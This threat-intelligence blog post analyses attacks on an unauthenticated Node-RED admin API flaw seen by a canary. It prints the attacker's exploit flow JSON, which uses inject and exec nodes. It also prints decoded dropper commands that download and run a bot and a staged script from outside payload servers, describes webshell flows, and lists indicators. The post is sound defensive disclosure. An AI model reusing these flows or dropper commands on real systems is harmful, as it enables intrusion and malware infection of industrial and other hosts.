# extract: served via trafilatura-direct
---
title: Exploitation Targeting Node-RED, a Tool Embedded in ICS Products | Blog | VulnCheck
url: https://www.vulncheck.com/blog/exploitation-targeting-node-red
hostname: vulncheck.com
description: On October 30, 2026, one of our canaries caught an attacker exploiting CVE-2026-58115, an unauthenticated Node-RED admin API flaw, to deploy a flow that downloads and runs a Linux bot. The request came from an IP in Microsoft's ASN (AS8075).
sitename: VulnCheck
date: "2026-11-01"
fingerprint: b5d99c906b271487
---
On October 30, 2026, one of our canaries caught an attacker exploiting CVE-2026-58115, an unauthenticated Node-RED admin API flaw, to deploy a flow that downloads and runs a Linux bot. The request came from an IP in Microsoft's ASN (AS8075). We have since seen 16 events from the same IP against this CVE, covering several different payloads (see the Update section below).

The attacker's request was a complete exploit. It deployed a Node-RED flow, triggered it automatically, and pulled a binary from an attacker-controlled server, all behind three layers of encoding. We decoded each layer and extracted the payload server, the drop path, and the execution method. This post walks through the request, the dropper, and what we can and can't say about the infrastructure behind it. We did not retrieve or analyze the bot binary itself, so we make no claims about its capabilities.

## [Exploiting Node-RED](https://www.vulncheck.com#exploiting-node-red)

Node-RED is a flow-based programming tool that makes it easy to create event-driven applications in a simple and intuitive way. It's built on top of Node.js and provides a browser-based editor for wiring flows together. It can run on devices such as the Raspberry Pi or in cloud environments, and it has been used across a wide range of industries, from manufacturing and utilities to healthcare and agriculture, and in both home and industrial automation.

Node-RED is also used in critical infrastructure. This CVE was assigned by Siemens and affects the SIMATIC IoT2050 Advance, which shows the software is embedded in commercial ICS/OT products. Emerson's documentation also highlights its use of Node-RED, although we haven't validated whether their products are impacted by this vulnerability.

CVE-2026-58115 allows unauthenticated access to programming nodes that are capable of executing system commands on the server.

Two built-in node types make this trivial to weaponize. An `inject` node fires a message on a schedule or once at startup, and an `exec` node runs a shell command. Wire one to the other and the flow executes a command as soon as it is deployed, with no further interaction.

The canary answered the request with HTTP 200 and a new flow revision hash, exactly as a vulnerable instance would. That response is why the signature records this event as a successful exploit.

## [The Exploitation Activity](https://www.vulncheck.com#the-exploitation-activity)

The attacker sent one `POST /flows` from curl/8.5.0. The body contains a Node-RED flow definition, and that flow's shell command contains a base64 string that decodes into the real dropper.
**Layer 1: the flow definition.** Three nodes: an empty tab, an `inject` node set to fire once after a one-second delay, and an `exec` node wired to it.

```
{"flows":[
  {"id":"t","type":"tab"},
  {"id":"inj","type":"inject","z":"t","once":true,"onceDelay":"1","wires":[["e"]]},
  {"id":"e","type":"exec","z":"t","command":"echo <base64> | base64 -d | sh","addpay":false,"useSpawn":"false","wires":[[],[],[]]}
]}
```
**Layer 2: the shell wrapper.** The `exec` node's command pipes a base64 string through `base64 -d` into `sh`. Encoding the dropper this way means a naive filter looking for `wget` or `curl` in the request body would not see them.

**Layer 3: the dropper.** Decoding the base64 reveals the actual commands:

```
wget -q -O /dev/shm/.b http://85.215.73[.]250:8080/bot-linux-amd64 \
  || curl -s -L http://85.215.73[.]250:8080/bot-linux-amd64 -o /dev/shm/.b
chmod +x /dev/shm/.b
(setsid /dev/shm/.b >/dev/null 2>&1 || nohup /dev/shm/.b >/dev/null 2>&1 &)
```
The canary's recorded response is a standard Node-RED reply to a flow deployment:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 74
{"rev":"4662660a5924cc8f09736d32ca1b8d8728d8e69805e7d1e8c9efdbdffa3cf0f1"}
```
Note that `payload` and `http_request_body` hold different things in a canary record. The first is the response the canary sent back, and the second is the attacker's request body.

## [Inside the Dropper](https://www.vulncheck.com#inside-the-dropper)

- **Download with a fallback.** It tries `wget` first and falls back to `curl`. Minimal containers often ship with one but not the other, so trying both raises the odds of success.
- **Memory-backed drop path.** The binary is saved as `/dev/shm/.b`. `/dev/shm` is a RAM-backed tmpfs, so nothing is written to disk, and the leading dot hides the file from a plain `ls`. The trade-off for the attacker is that the file disappears on reboot unless the bot sets up persistence by other means.
- **Detached execution.** `setsid` starts the process in its own session so it outlives the Node-RED process that spawned it, with `nohup` as a fallback. All output is discarded.
- **Fire and forget.** There is no check that the download succeeded and no cleanup. The command is built to run once, silently, and return.
The filename `bot-linux-amd64` tells us the target architecture and that the operator uses a naming scheme suggesting other builds may exist. We did not fetch the binary, so we can't say what it does once running.

## [The Infrastructure](https://www.vulncheck.com#the-infrastructure)

**The exploit source: 4.201.105.116.** This IP sits in AS8075, Microsoft's network, and geolocates to Brazil. It didn't just scan us. It sent the complete exploit, flow and dropper, in a single `POST /flows`. We have seen it hit this Node-RED CVE 16 times between October 30 and November 1, and across our wider canary data the same address has logged 125 hits against 8 different CVEs over recent days: Apache Solr (CVE-2019-17558), Camunda, Gitea, MLflow, Traefik, and Joomla, alongside this Node-RED flaw. That breadth, old bugs and new, across unrelated products, is the signature of opportunistic mass scanning rather than a targeted attack. On at least one of those other hits it delivered a different drop-and-run payload pointing at a separate server, so the box is better read as opportunistic exploitation infrastructure than as a single operator tied to this one campaign. The Node-RED hits reinforce that reading: they used at least five different user agents (including curl, python-requests, Python-urllib, and browser strings) and several distinct payloads, which fits shared or rented infrastructure used by more than one operator. An address in a major cloud provider's range is more often a compromised or rented virtual machine than the operator's own hardware, so abuse reports to the provider are worth sending, but the address says little about who is behind it.

**The payload server: 85.215.73.250.** The dropper pulls its binary from port 8080 on this host. We never saw this server directly. It appears only inside the decoded dropper command, so we have no canary telemetry on it beyond the URL. Because the download host is a different machine from the one that sent the exploit, the likely setup is a scan-and-infect arrangement: the hosts that find and exploit vulnerable instances pull the implant from a separate, dedicated server.

## [Update (November 1, 2026)](https://www.vulncheck.com#update-november-1-2026)

Since the original analysis, the same source IP has delivered additional payloads against our canaries:

- **A second dropper variant from the same server.** Rather than pulling the binary directly, this variant fetches a staged shell script: ```
wget -q -O /tmp/.s http://85.215.73[.]250:8080/wget.sh && sh /tmp/.s
```
The bot dropper above was also seen again several times.
- **A different payload server.** One request ran `curl`/`wget` against `http://45.194.90[.]57:38472/.sys_update`, saved the result as `/tmp/.kworker` (a name that mimics a kernel worker thread), and executed it with `nohup`.
- **Persistent webshells.** Several requests deployed no downloader at all. Instead, the flow exposes an `http in` endpoint (for example `/cmd`, or a randomly named path) wired through a function node to an `exec` node with `addpay` enabled, so the attacker could run arbitrary commands later by passing them in a query parameter. This backdoor survives even if a memory-backed implant is lost on reboot.

We did not retrieve `wget.sh` or `.kworker`, so we make no claims about either.

## [Summary](https://www.vulncheck.com#summary)

What started as a single canary event gave us a complete exploit chain: an unauthenticated flow deployment, an automatic trigger, a three-layer encoded dropper, and a payload server we can now track. The attacker spent no effort on stealth beyond base64 and a hidden RAM-backed file, which suggests the operation counts on volume rather than subtlety.

Our detection for CVE-2026-58115 was published on October 27, and we caught this in-the-wild attempt on October 30, three days later, and moved the CVE into VulnCheck's KEV catalog; it is not in CISA's KEV at the time of writing. The limits of what we can conclude matter. These events come from one source IP. We did not retrieve the binary or the staged scripts, so we don't know whether they are a reverse shell, a cryptominer, a DDoS bot, or something else. The scanner's presence in Microsoft's address space doesn't identify the operator, and a shared naming scheme or hosting provider doesn't establish that other campaigns belong to the same actor.

What we can say is that Node-RED instances without `adminAuth` are being found and exploited automatically, and that a deployment takes one HTTP request. If you run Node-RED anywhere, including embedded in your ICS/OT environment, check whether it can be reached from outside your network today. Also review deployed flows for unexpected `exec` nodes or HTTP endpoints, since some attackers are leaving webshells rather than bots.

Analysis performed October 30, 2026, from canary telemetry, with additional events reviewed November 1, 2026. The CVE description is based on the canary signature and observed traffic.

## [Indicators of Compromise](https://www.vulncheck.com#indicators-of-compromise)

### [Network](https://www.vulncheck.com#network)

| Type | Indicator | Context | 
|---|---|---|
| IP | 4.201.105.116 | Attack source, AS8075 Microsoft Corporation | 
| IP | 85.215.73.250 | Payload server, port 8080 | 
| URL |  | Dropper download URL | 
| URL |  | Staged script variant | 
| IP | 45.194.90.57 | Second payload server, port 38472 | 
| URL |  | Second dropper download URL | 

### [VulnCheck Initial Access Artifacts](https://www.vulncheck.com#vulncheck-initial-access-artifacts)

On October 27, 2026, VulnCheck's Initial Access team shipped detection artifacts including an exploit PoC, version scanner, PCAP, Suricata, Snort, and YARA rules, a Docker container, and Shodan, Censys, GreyNoise, FOFA, and ZoomEye queries for VulnCheck Initial Access customers.

## [About VulnCheck](https://www.vulncheck.com#about-vulncheck)

VulnCheck is helping organizations not just to solve the vulnerability prioritization challenge - we’re working to help equip any product manager, CSIRT/PSIRT or SecOps team and Threat Hunting team to get faster and more accurate with infinite efficiency using VulnCheck solutions.

We knew that we needed better data, faster across the board, in our industry. So that’s what we deliver to the market. We’re going to continue to deliver key insights on vulnerability management, exploitation and major trends we can extrapolate from our dataset to continuously support practitioners.

Are you interested in learning more? If so, VulnCheck's [Exploit & Vulnerability Intelligence](https://vulncheck.com/product/exploit-intelligence) has broad threat actor coverage. Register and demo our data today.
